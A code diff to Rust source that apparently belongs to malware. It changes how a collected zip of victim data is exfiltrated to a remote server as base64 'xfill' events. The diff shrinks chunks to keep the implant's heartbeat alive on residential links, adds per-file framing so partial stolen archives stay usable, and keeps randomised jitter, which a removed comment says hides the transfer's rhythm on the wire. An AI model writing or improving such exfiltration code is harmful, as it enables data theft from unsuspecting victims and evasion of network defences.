@@ -52,7 +52,9 @@ type HostCallback = unsafe extern "stdcall" fn(
 static mut G_CALLBACK: Option<HostCallback> = None;
 
 /// Raw bytes per chunk event (base64 expands this ~4/3 on the wire).
-const CHUNK_SIZE: usize = 2 * 1024 * 1024;
+/// Small enough that a single WS write never starves the agent heartbeat on
+/// weak residential links — 2 MiB chunks caused push-induced disconnects.
+const CHUNK_SIZE: usize = 512 * 1024;
 
 unsafe fn send_event(event: &str, payload: &[u8]) {
     if let Some(cb) = G_CALLBACK {
@@ -176,7 +178,9 @@ fn try_collect() -> Result<(), String> {
 
     let info_bytes = serde_json::to_vec_pretty(&info).map_err(|e| e.to_string())?;
     zip.add_file("Info.json", &info_bytes);
+    progress("zipping");
     let bytes = zip.finish().map_err(|e| e.to_string())?;
+    progress("pushing");
     push_zip(&bytes, &info);
     Ok(())
 }
@@ -210,27 +214,61 @@ fn session_id_u64() -> u64 {
     }
 }
 
-/// Push a finished zip to the server as base64 chunk events, with jitter
-/// between chunks so the transfer has no machine-gun rhythm on the wire.
+/// Push a finished zip to the server as per-file base64 chunk events.
+///
+/// Per-file (not per-zip-byte) framing: each zip entry is transferred as its
+/// own unit, so a connection drop mid-transfer still leaves every completed
+/// file usable server-side (partial archives are built from what arrived —
+/// a zip's central directory lives at the end, so raw byte-chunked transfers
+/// lose EVERYTHING on a drop).
 fn push_zip(zip_bytes: &[u8], info: &info::Info) {
     use base64::Engine;
     let engine = base64::engine::general_purpose::STANDARD;
     let session = session_id_u64();
-    let total = zip_bytes.len().div_ceil(CHUNK_SIZE).max(1) as u32;
 
-    for (index, chunk) in zip_bytes.chunks(CHUNK_SIZE).enumerate() {
-        send_json(
-            "xfill_chunk",
-            &serde_json::json!({
-                "session": session,
-                "index": index as u32,
-                "total": total,
-                "data": engine.encode(chunk),
-            }),
-        );
-        if (index as u32) + 1 < total {
-            jitter::sleep_jitter(100, 400);
+    let Ok(mut archive) = zip::ZipArchive::new(std::io::Cursor::new(zip_bytes)) else {
+        return;
+    };
+    let file_count = archive.len();
+    let mut sent_files = 0u32;
+
+    for findex in 0..file_count {
+        let Ok(mut entry) = archive.by_index(findex) else {
+            continue;
+        };
+        if entry.is_dir() {
+            continue;
         }
+        let path = entry.name().to_string();
+        let mut data = Vec::with_capacity(entry.size() as usize);
+        if std::io::Read::read_to_end(&mut entry, &mut data).is_err() {
+            continue;
+        }
+        drop(entry);
+
+        let chunks_total = data.len().div_ceil(CHUNK_SIZE).max(1) as u32;
+        for (index, chunk) in data.chunks(CHUNK_SIZE).enumerate() {
+            send_json(
+                "xfill_file",
+                &serde_json::json!({
+                    "session": session,
+                    "path": path,
+                    "findex": findex as u32,
+                    "ftotal": file_count as u32,
+                    "index": index as u32,
+                    "total": chunks_total,
+                    "data": engine.encode(chunk),
+                }),
+            );
+            if (index as u32) + 1 < chunks_total {
+                jitter::sleep_jitter(50, 200);
+            }
+        }
+        sent_files += 1;
+        send_json(
+            "xfill_progress",
+            &serde_json::json!({ "stage": format!("push file {}/{} {} ({} KB)", sent_files, file_count, path, data.len() / 1024) }),
+        );
     }
 
     send_json(
@@ -238,7 +276,7 @@ fn push_zip(zip_bytes: &[u8], info: &info::Info) {
         &serde_json::json!({
             "session": session,
             "size": zip_bytes.len(),
-            "chunks": total,
+            "files": file_count,
             "info": info,
         }),
     );
